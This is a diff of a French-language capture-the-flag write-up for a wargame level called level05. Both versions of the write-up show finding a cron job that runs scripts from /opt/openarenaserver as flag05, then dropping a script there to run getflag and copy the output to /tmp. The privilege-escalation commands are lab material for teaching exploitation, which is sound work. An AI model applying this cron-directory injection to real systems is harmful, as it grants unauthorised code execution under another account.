@@ -1,24 +1,16 @@
-Quand on arrive sur le level05, on nous dit qu'on a recu un mail.
-En faisant un `find / -name mail 2>/dev/null`, on trouve un dossier /var/mail.
+Le dossier de l'utilisateur level05 est vide, on a donc fait une recherche d'un fichier/dossier nommé level05.
+`find / -name "level05" 2>/dev/null`
 
-Ce dossier contient level05 et dans ce fichier on peut voir `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
-
-On affiche openarenaserver:
-
-```
-#!/bin/sh
-
-for i in /opt/openarenaserver/* ; do
-        (ulimit -t 5; bash -x "$i")
-        rm -f "$i"
-done
+On trouve les résultats suivants (qui sont les mêmes fichiers)
+```txt
+/var/mail/level05
+/rofs/var/mail/level05
 ```
 
-On voit que le script regarde dans le dossier `/opt/openarenaserver/`, execute ce qu'il y'a dedans et supprime le fichier.
+Le contenu est une tâche cron
+`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
+Le code executé toutes les 2 minutes contenu dans `/usr/sbin/openarenaserver` execute tous les scripts dans `/opt/openarenaserver/*`.
 
-On fait donc un script qui appelle getflag et met le resultat dans un fichier: 
-`echo "getflag > /tmp/getflag" > getflag.sh`
-
-Il faut pas que le fichier existe avant.
-
-On fait `cat /tmp/getflag` et on obtient donc le flag.
+On peut donc créer un fichier qui executera getflag dans ce répertoire, et mettra le résultat dans un dossier ou flag05 et level05 peuvent accéder.
+`echo 'getflag > /tmp/flag05; chmod +rw /tmp/flag05' > /opt/openarenaserver/crackflag`
+`chmod +x /opt/openarenaserver/crackflag`
